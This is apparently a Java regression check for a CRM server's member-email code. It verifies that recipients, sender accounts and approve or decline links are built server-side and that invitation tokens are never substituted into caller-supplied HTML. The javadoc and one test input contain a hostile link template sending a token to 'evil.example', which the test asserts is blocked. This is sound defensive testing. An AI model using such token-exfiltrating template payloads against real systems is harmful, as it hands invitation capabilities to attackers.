package one.modality.crm.server.person;

/**
 * Check for the member emails the server now composes.
 *
 * <p>What is pinned is the split. The browser supplies translated prose and nothing else; the server
 * supplies the recipient, the sending account and every url. Each of those is one edit away from
 * going back, and each looks harmless on its own: a {@code toEmail} parameter "so the caller can say
 * where it goes", an {@code account} argument "so it can pick the right sender", a {@code {{TOKEN}}}
 * placeholder "so the template can build its own link". Any one of them reopens the relay.
 *
 * <p>The token placeholder is the subtle one and has its own assertions below. Substituting a bare
 * token into caller-authored HTML would let {@code <a href="https://evil.example/?t={{TOKEN}}">} have
 * this server paste an invitation capability into somebody else's url.
 */
public class MemberMailCheck {

    static int pass = 0, fail = 0;

    static void check(String what, boolean ok) {
        if (ok) { pass++; System.out.println("  ok   " + what); }
        else { fail++; System.out.println("  FAIL " + what); }
    }

    private static final String BASE = "modality-fork/modality-crm/modality-crm-server-person-plugin/"
                                       + "src/main/java/one/modality/crm/server/person/";

    private static int countOf(String text, String needle) {
        int n = 0;
        for (int at = text.indexOf(needle); at >= 0; at = text.indexOf(needle, at + needle.length()))
            n++;
        return n;
    }

    public static void main(String[] args) {
        System.out.println("MemberMailCheck");
        String source = AccountOwnerCheck.readSource(BASE + "MemberMail.java");
        check("the source was found", !source.isEmpty());

        // --- links are substituted WHOLE, and the token is never a placeholder ---
        String body = "<p>hi</p><a href=\"{{APPROVE_LINK}}\">yes</a><a href=\"{{DECLINE_LINK}}\">no</a>";
        String resolved = MemberMail.resolveLinks(body, "https://kadampabookings.org", "tok123");
        check("the approve link is a whole url built here",
            resolved.contains("https://kadampabookings.org/members/approve/tok123"));
        check("and so is the decline link",
            resolved.contains("https://kadampabookings.org/members/decline/tok123"));
        check("no placeholder survives substitution",
            !resolved.contains("{{APPROVE_LINK}}") && !resolved.contains("{{DECLINE_LINK}}"));
        check("the account link needs no token",
            MemberMail.resolveLinks("{{ACCOUNT_LINK}}", "https://x.org", null).equals("https://x.org/members"));
        check("with no token, an approve link degrades to the account page rather than a broken url",
            MemberMail.resolveLinks("{{APPROVE_LINK}}", "https://x.org", null).equals("https://x.org/members"));

        // THE one that matters most: there is no token placeholder to abuse.
        //
        // Scoped to the METHOD BODY, not the file. A whole-file "does not contain" is worthless the
        // moment the class explains itself — the javadoc above resolveLinks names the very construct
        // it refuses to support, and an earlier version of this assertion failed on that prose. Three
        // checks in this package have now been written that way and two of them shipped green for the
        // wrong reason; assert on the code, never on the file.
        String resolveBody = AccountOwnerCheck.between(source, "static String resolveLinks", "\n    }");
        check("resolveLinks was found", !resolveBody.isEmpty());
        check("its substitutions are the three whole links and nothing else",
            countOf(resolveBody, ".replace(") == 3);
        check("none of them substitutes a bare token",
            !resolveBody.contains("TOKEN}}"));
        String hostile = "<a href=\"https://evil.example/?t={{TOKEN}}\">click</a>";
        check("so a caller's own url cannot have the token pasted into it",
            MemberMail.resolveLinks(hostile, "https://x.org", "tok123").equals(hostile));
        check("and the token never reaches a substitution by any other name",
            !source.contains("replace(\"{{") || !source.contains("token)"));

        // --- who receives it, and from where, are read here ---
        check("the recipient's address is READ from the person the operation acted on",
            source.contains("select first_name, last_name, email from person where id = $1"));
        check("the mail is outgoing, with the account this server configures",
            source.contains("values ($1, true, $2, $3, $4, $5) returning id")
            && source.contains("configuredMailAccountId()"));
        check("the recipient row is tied to that person, not only to a typed address",
            source.contains("insert into recipient (mail_id, person_id, name, email"));
        check("the mail insert returns its id, which the recipient's reference needs",
            source.contains("setReturnGeneratedKeys(true)")
            && source.contains("new GeneratedKeyReference(0)"));

        // --- nothing about the destination comes from the caller ---
        check("no parameter names a destination address",
            !source.contains("String toEmail") && !source.contains("Object toEmail"));
        check("an unconfigured origin SKIPS the mail rather than sending a broken one",
            source.contains("Member email not sent"));

        // --- and it reads the config that actually has the value in it ---
        //
        // This one is here because getting it wrong fails SILENTLY and completely. SourcesConfig
        // parses the bundled declare@ files and substitutes nothing, so it returns the literal
        // "${{ FRONTOFFICE_ORIGIN }}"; this class reads that as unconfigured and stops sending, with
        // one log line and no other symptom. The first version of this class did exactly that.
        // ConfigLoader's root config merges the loaded providers over those sources, and the
        // providers are what resolve a deploy's environment.
        check("the origin is read through ConfigLoader, which resolves the deploy's variables",
            source.contains("ConfigLoader.getRootConfig().childConfigAt(CONFIG_PATH)"));
        // Named as the CALL and the IMPORT, not the word. Scoping to the method body does not help
        // here — the comment explaining the trap lives inside that very method. Anything of the form
        // "the source does not mention X" is broken by prose about X, and this is the fourth
        // assertion in this package written that way. Assert on something only code can contain.
        check("and NOT through SourcesConfig, which would hand back the unsubstituted template",
            !source.contains("SourcesConfig.getSourcesRootConfig()")
            && !source.contains("import dev.webfx.platform.conf.SourcesConfig;"));
        check("the config path matches this plugin's declare@ file name",
            source.contains("CONFIG_PATH = \"modality.crm.server.person\""));

        // --- and the token stopped being handed back ---
        String invitation = AccountOwnerCheck.readSource(BASE + "InvitationRules.java");
        check("createInvitation no longer returns the token to its caller",
            invitation.contains("static Future<Object> createInvitation("));
        check("it sends the invitation email itself",
            invitation.contains("MemberMail.sendToPerson("));

        String link = AccountOwnerCheck.readSource(BASE + "PersonLinkRules.java");
        check("approveInvitation tells the INVITER, whom it already identified",
            link.contains("MemberMail.sendToPerson(inviterId,"));
        check("and only when the link was actually established",
            link.contains("!Boolean.TRUE.equals(ok) ? Future.succeededFuture(ok)"));

        // --- and a deploy says at boot whether any of this can happen ---
        //
        // The skip in sendToPerson is the right behaviour but a terrible signal: it appears the first
        // time somebody invites a member, so an unresolved origin reads as a healthy deploy until an
        // inviter waits for a mail that was never sent. The boot line is what makes that visible on
        // the day of the deploy instead.
        check("the configuration is announced at boot",
            source.contains("static void announceConfiguration()"));
        check("and says plainly that emails are disabled when it cannot build a link",
            source.contains("Member emails are DISABLED"));
        String job = AccountOwnerCheck.readSource(BASE + "MemberMailJob.java");
        check("a boot job exists to announce it", !job.isEmpty()
            && job.contains("implements ApplicationJob"));
        check("it waits for the config to LOAD rather than reading it at start",
            job.contains("ConfigLoader.onConfigLoaded(MemberMail.CONFIG_PATH"));

        System.out.println(pass + " passed, " + fail + " failed");
        if (fail > 0)
            System.exit(1);
    }
}
